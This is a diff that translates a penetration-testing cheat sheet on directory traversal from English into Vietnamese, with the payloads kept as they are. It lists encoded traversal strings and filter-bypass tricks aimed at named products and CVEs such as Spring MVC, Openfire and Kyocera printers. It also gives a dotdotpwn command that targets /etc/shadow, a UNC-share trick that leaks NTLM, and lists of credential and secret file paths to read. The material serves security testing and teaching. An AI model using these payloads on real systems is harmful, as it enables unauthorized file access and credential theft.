@@ -1,40 +1,40 @@
-# Directory Traversal
+# Directory Traversal (Dò Tìm Đường Dẫn)
 
-> Path Traversal, also known as Directory Traversal, is a type of security vulnerability that occurs when an attacker manipulates variables that reference files with “dot-dot-slash (../)” sequences or similar constructs. This can allow the attacker to access arbitrary files and directories stored on the file system.
+> Path Traversal, còn được gọi là Directory Traversal, là một loại lỗ hổng bảo mật xảy ra khi kẻ tấn công thao túng các biến tham chiếu đến tệp bằng chuỗi "dot-dot-slash (../)" hoặc các cấu trúc tương tự. Điều này có thể cho phép kẻ tấn công truy cập vào các tệp và thư mục tùy ý được lưu trữ trên hệ thống tệp.
 
-## Summary
+## Tóm tắt
 
-* [Tools](#tools)
-* [Methodology](#methodology)
+* [Công cụ](#tools)
+* [Phương pháp](#methodology)
     * [URL Encoding](#url-encoding)
     * [Double URL Encoding](#double-url-encoding)
     * [Unicode Encoding](#unicode-encoding)
     * [Overlong UTF-8 Unicode Encoding](#overlong-utf-8-unicode-encoding)
-    * [Mangled Path](#mangled-path)
+    * [Đường dẫn bị làm rối (Mangled Path)](#mangled-path)
     * [NULL Bytes](#null-bytes)
-    * [Reverse Proxy URL Implementation](#reverse-proxy-url-implementation)
-* [Exploit](#exploit)
+    * [Triển khai URL qua Reverse Proxy](#reverse-proxy-url-implementation)
+* [Khai thác](#exploit)
     * [UNC Share](#unc-share)
     * [ASPNET Cookieless](#asp-net-cookieless)
     * [IIS Short Name](#iis-short-name)
     * [Java URL Protocol](#java-url-protocol)
 * [Path Traversal](#path-traversal)
-    * [Linux Files](#linux-files)
-    * [Windows Files](#windows-files)
+    * [Tệp Linux](#linux-files)
+    * [Tệp Windows](#windows-files)
 * [Labs](#labs)
-* [References](#references)
+* [Tài liệu tham khảo](#references)
 
-## Tools
+## Công cụ
 
-* [wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn) - The Directory Traversal Fuzzer
+* [wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn) - Công cụ Fuzzer dò tìm Directory Traversal
 
     ```powershell
     perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
     ```
 
-## Methodology
+## Phương pháp
 
-We can use the `..` characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.
+Chúng ta có thể sử dụng các ký tự `..` để truy cập vào thư mục cha, các chuỗi sau đây là một số cách mã hóa có thể giúp bạn vượt qua một bộ lọc được triển khai kém.
 
 ```powershell
 ../
@@ -49,13 +49,13 @@ We can use the `..` characters to access the parent directory, the following str
 
 ### URL Encoding
 
-| Character | Encoded |
+| Ký tự | Đã mã hóa |
 | --------- | ------- |
 | `.`       | `%2e`   |
 | `/`       | `%2f`   |
 | `\`       | `%5c`   |
 
-**Example:** IPConfigure Orchid Core VMS 2.0.5 - Local File Inclusion
+**Ví dụ:** IPConfigure Orchid Core VMS 2.0.5 - Local File Inclusion
 
 ```ps1
 {{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
@@ -63,15 +63,15 @@ We can use the `..` characters to access the parent directory, the following str
 
 ### Double URL Encoding
 
-Double URL encoding is the process of applying URL encoding twice to a string. In URL encoding, special characters are replaced with a % followed by their hexadecimal ASCII value. Double encoding repeats this process on the already encoded string.
+Double URL encoding là quá trình áp dụng mã hóa URL hai lần lên một chuỗi. Trong mã hóa URL, các ký tự đặc biệt được thay thế bằng dấu % theo sau là giá trị ASCII thập lục phân của chúng. Mã hóa kép lặp lại quá trình này trên chuỗi đã được mã hóa.
 
-| Character | Encoded |
+| Ký tự | Đã mã hóa |
 | --------- | ------- |
 | `.`       | `%252e` |
 | `/`       | `%252f` |
 | `\`       | `%255c` |
 
-**Example:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271)
+**Ví dụ:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271)
 
 ```ps1
 {{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
@@ -80,13 +80,13 @@ Double URL encoding is the process of applying URL encoding twice to a string. I
 
 ### Unicode Encoding
 
-| Character | Encoded  |
+| Ký tự | Đã mã hóa  |
 | --------- | -------- |
 | `.`       | `%u002e` |
 | `/`       | `%u2215` |
 | `\`       | `%u2216` |
 
-**Example**: Openfire Administration Console - Authentication Bypass (CVE-2023-32315)
+**Ví dụ**: Openfire Administration Console - Authentication Bypass (CVE-2023-32315)
 
 ```js
 {{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
@@ -94,24 +94,24 @@ Double URL encoding is the process of applying URL encoding twice to a string. I
 
 ### Overlong UTF-8 Unicode Encoding
 
-The UTF-8 standard mandates that each codepoint is encoded using the minimum number of bytes necessary to represent its significant bits. Any encoding that uses more bytes than required is referred to as "overlong" and is considered invalid under the UTF-8 specification. This rule ensures a one-to-one mapping between codepoints and their valid encodings, guaranteeing that each codepoint has a single, unique representation.
+Tiêu chuẩn UTF-8 quy định rằng mỗi codepoint phải được mã hóa bằng số byte tối thiểu cần thiết để biểu diễn các bit có nghĩa của nó. Bất kỳ cách mã hóa nào sử dụng nhiều byte hơn mức cần thiết đều được gọi là "overlong" và được coi là không hợp lệ theo đặc tả UTF-8. Quy tắc này đảm bảo ánh xạ một-một giữa các codepoint và cách mã hóa hợp lệ của chúng, đảm bảo rằng mỗi codepoint chỉ có một cách biểu diễn duy nhất.
 
-| Character | Encoded                         |
+| Ký tự | Đã mã hóa                         |
 | --------- | ------------------------------- |
 | `.`       | `%c0%2e`, `%e0%40%ae`, `%c0%ae` |
 | `/`       | `%c0%af`, `%e0%80%af`, `%c0%2f` |
 | `\`       | `%c0%5c`, `%c0%80%5c`           |
 
-### Mangled Path
+### Đường dẫn bị làm rối (Mangled Path)
 
-Sometimes you encounter a WAF which remove the `../` characters from the strings, just duplicate them.
+Đôi khi bạn sẽ gặp một WAF loại bỏ các ký tự `../` khỏi chuỗi, chỉ cần nhân đôi chúng lên.
 
 ```powershell
 ..././
 ...\.\
 ```
 
-**Example:**: Mirasys DVMS Workstation <=5.12.6
+**Ví dụ:**: Mirasys DVMS Workstation <=5.12.6
 
 ```ps1
 {{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini
@@ -119,68 +119,68 @@ Sometimes you encounter a WAF which remove the `../` characters from the strings
 
 ### NULL Bytes
 
-A null byte (`%00`), also known as a null character, is a special control character (0x00) in many programming languages and systems. It is often used as a string terminator in languages like C and C++. In directory traversal attacks, null bytes are used to manipulate or bypass server-side input validation mechanisms.
+Một byte null (`%00`), còn được gọi là ký tự null, là một ký tự điều khiển đặc biệt (0x00) trong nhiều ngôn ngữ lập trình và hệ thống. Nó thường được dùng làm ký tự kết thúc chuỗi trong các ngôn ngữ như C và C++. Trong các cuộc tấn công directory traversal, byte null được dùng để thao túng hoặc vượt qua các cơ chế kiểm tra đầu vào phía máy chủ.
 
-**Example:** Homematic CCU3 CVE-2019-9726
+**Ví dụ:** Homematic CCU3 CVE-2019-9726
 
 ```js
 {{BaseURL}}/.%00./.%00./etc/passwd
 ```
 
-**Example:** Kyocera Printer d-COPIA253MF CVE-2020-23575
+**Ví dụ:** Kyocera Printer d-COPIA253MF CVE-2020-23575
 
 ```js
 {{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
 ```
 
-### Reverse Proxy URL Implementation
+### Triển khai URL qua Reverse Proxy
 
-Nginx treats `/..;/` as a directory while Tomcat treats it as it would treat `/../` which allows us to access arbitrary servlets.
+Nginx coi `/..;/` là một thư mục trong khi Tomcat lại xử lý nó như thể là `/../`, điều này cho phép chúng ta truy cập vào các servlet tùy ý.
 
 ```powershell
 ..;/
 ```
 
-**Example**: Pascom Cloud Phone System CVE-2021-45967
+**Ví dụ**: Pascom Cloud Phone System CVE-2021-45967
 
-A configuration error between NGINX and a backend Tomcat server leads to a path traversal in the Tomcat server, exposing unintended endpoints.
+Một lỗi cấu hình giữa NGINX và máy chủ Tomcat phía sau dẫn đến lỗ hổng path traversal trên máy chủ Tomcat, làm lộ ra các endpoint không mong muốn.
 
 ```js
 {{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}
 ```
 
-## Exploit
+## Khai thác
 
-These exploits affect mechanism linked to specific technologies.
+Các khai thác này ảnh hưởng đến cơ chế liên quan đến các công nghệ cụ thể.
 
 ### UNC Share
 
-A UNC (Universal Naming Convention) share is a standard format used to specify the location of resources, such as shared files, directories, or devices, on a network in a platform-independent manner. It is commonly used in Windows environments but is also supported by other operating systems.
+UNC (Universal Naming Convention) share là một định dạng chuẩn được dùng để chỉ định vị trí của các tài nguyên, chẳng hạn như tệp, thư mục hoặc thiết bị được chia sẻ, trên mạng theo cách không phụ thuộc vào nền tảng. Nó thường được dùng trong môi trường Windows nhưng cũng được các hệ điều hành khác hỗ trợ.
 
-An attacker can inject a **Windows** UNC share (`\\UNC\share\name`) into a software system to potentially redirect access to an unintended location or arbitrary file.
+Kẻ tấn công có thể chèn một UNC share của **Windows** (`\\UNC\share\name`) vào một hệ thống phần mềm để có thể chuyển hướng truy cập đến một vị trí hoặc tệp tùy ý không mong muốn.
 
 ```powershell
 \\localhost\c$\windows\win.ini
 ```
 
-Also the machine might also authenticate on this remote share, thus sending an NTLM exchange.
+Ngoài ra, máy chủ cũng có thể xác thực trên share từ xa này, do đó gửi đi một trao đổi NTLM.
 
 ### ASP NET Cookieless
 
-When cookieless session state is enabled. Instead of relying on a cookie to identify the session, ASP.NET modifies the URL by embedding the Session ID directly into it.
+Khi tính năng cookieless session state được bật. Thay vì dựa vào cookie để nhận diện phiên làm việc, ASP.NET sẽ chỉnh sửa URL bằng cách nhúng trực tiếp Session ID vào đó.
 
-For example, a typical URL might be transformed from: `http://example.com/page.aspx` to something like: `http://example.com/(S(lit3py55t21z5v55vlm25s55))/page.aspx`. The value within `(S(...))` is the Session ID.
+Ví dụ, một URL thông thường có thể được chuyển đổi từ: `http://example.com/page.aspx` thành dạng như: `http://example.com/(S(lit3py55t21z5v55vlm25s55))/page.aspx`. Giá trị nằm trong `(S(...))` chính là Session ID.
 
-| .NET Version | URI                        |
+| Phiên bản .NET | URI                        |
 | ------------ | -------------------------- |
 | V1.0, V1.1   | /(XXXXXXXX)/               |
 | V2.0+        | /(S(XXXXXXXX))/            |
 | V2.0+        | /(A(XXXXXXXX)F(YYYYYYYY))/ |
 | V2.0+        | ...                        |
 
-We can use this behavior to bypass filtered URLs.
+Chúng ta có thể tận dụng hành vi này để vượt qua các URL bị lọc.
 
-* If your application is in the main folder
+* Nếu ứng dụng của bạn nằm trong thư mục chính
 
     ```ps1
     /(S(X))/
@@ -190,7 +190,7 @@ We can use this behavior to bypass filtered URLs.
     /(S(x))/b/(S(x))in/Navigator.dll
     ```
 
-* If your application is in a subfolder
+* Nếu ứng dụng của bạn nằm trong thư mục con
 
     ```ps1
     /MyApp/(S(X))/
@@ -207,7 +207,7 @@ We can use this behavior to bypass filtered URLs.
 
 ### IIS Short Name
 
-The IIS Short Name vulnerability exploits a quirk in Microsoft's Internet Information Services (IIS) web server that allows attackers to determine the existence of files or directories with names longer than the 8.3 format (also known as short file names) on a web server.
+Lỗ hổng IIS Short Name khai thác một điểm bất thường trong máy chủ web Internet Information Services (IIS) của Microsoft, cho phép kẻ tấn công xác định sự tồn tại của các tệp hoặc thư mục có tên dài hơn định dạng 8.3 (còn gọi là short file name) trên máy chủ web.
 
 * [irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
 
@@ -224,7 +224,7 @@ The IIS Short Name vulnerability exploits a quirk in Microsoft's Internet Inform
 
 ### Java URL Protocol
 
-Java's URL protocol when `new URL('')` is used allows the format `url:URL`
+Giao thức URL của Java khi `new URL('')` được sử dụng cho phép định dạng `url:URL`
 
 ```powershell
 url:file:///etc/passwd
@@ -233,9 +233,9 @@ url:http://127.0.0.1:8080
 
 ## Path Traversal
 
-### Linux Files
+### Tệp Linux
 
-* Operating System and Informations
+* Hệ điều hành và thông tin
 
     ```powershell
     /etc/issue
@@ -244,10 +244,10 @@ url:http://127.0.0.1:8080
     /etc/motd
     ```
 
-* Processes
+* Các tiến trình
 
     ```ps1
-    /proc/[0-9]*/fd/[0-9]*   # first number is the PID, second is the filedescriptor
+    /proc/[0-9]*/fd/[0-9]*   # số đầu tiên là PID, số thứ hai là filedescriptor
     /proc/self/environ
     /proc/version
     /proc/cmdline
@@ -255,7 +255,7 @@ url:http://127.0.0.1:8080
     /proc/mounts
     ```
 
-* Network
+* Mạng
 
     ```ps1
     /proc/net/arp
@@ -264,14 +264,14 @@ url:http://127.0.0.1:8080
     /proc/net/udp
     ```
 
-* Current Path
+* Đường dẫn hiện tại
 
     ```ps1
     /proc/self/cwd/index.php
     /proc/self/cwd/main.py
     ```
 
-* Indexing
+* Lập chỉ mục
 
     ```ps1
     /var/lib/mlocate/mlocate.db
@@ -279,7 +279,7 @@ url:http://127.0.0.1:8080
     /var/lib/mlocate.db
     ```
 
-* Credentials and history
+* Thông tin xác thực và lịch sử
 
     ```ps1
     /etc/passwd
@@ -298,16 +298,16 @@ url:http://127.0.0.1:8080
     /var/run/secrets/kubernetes.io/serviceaccount
     ```
 
-### Windows Files
+### Tệp Windows
 
-The files `license.rtf` and `win.ini` are consistently present on modern Windows systems, making them a reliable target for testing path traversal vulnerabilities. While their content isn't particularly sensitive or interesting, they serves well as a proof of concept.
+Các tệp `license.rtf` và `win.ini` luôn hiện diện trên các hệ thống Windows hiện đại, khiến chúng trở thành mục tiêu đáng tin cậy để kiểm thử các lỗ hổng path traversal. Mặc dù nội dung của chúng không đặc biệt nhạy cảm hay thú vị, nhưng chúng phục vụ tốt như một bằng chứng khái niệm (proof of concept).
 
 ```powershell
 C:\Windows\win.ini
 C:\windows\system32\license.rtf
 ```
 
-A list of files / paths to probe when arbitrary files can be read on a Microsoft Windows operating system: [soffensive/windowsblindread](https://github.com/soffensive/windowsblindread)
+Danh sách các tệp / đường dẫn cần dò khi có thể đọc tệp tùy ý trên hệ điều hành Microsoft Windows: [soffensive/windowsblindread](https://github.com/soffensive/windowsblindread)
 
 ```powershell
 c:/inetpub/logs/logfiles
@@ -342,7 +342,7 @@ c:/windows/repair/system
 * [PortSwigger - File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)
 * [PortSwigger - File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)
 
-## References
+## Tài liệu tham khảo
 
 * [Cookieless ASPNET - Soroush Dalili - March 27, 2023](https://web.archive.org/web/20241202163755/https://twitter.com/irsdl/status/1640390106312835072)
 * [CWE-40: Path Traversal: '\\UNC\share\name\' (Windows UNC Share) - CWE Mitre - December 27, 2018](https://web.archive.org/web/20080115180212/http://cwe.mitre.org:80/data/definitions/40.html)
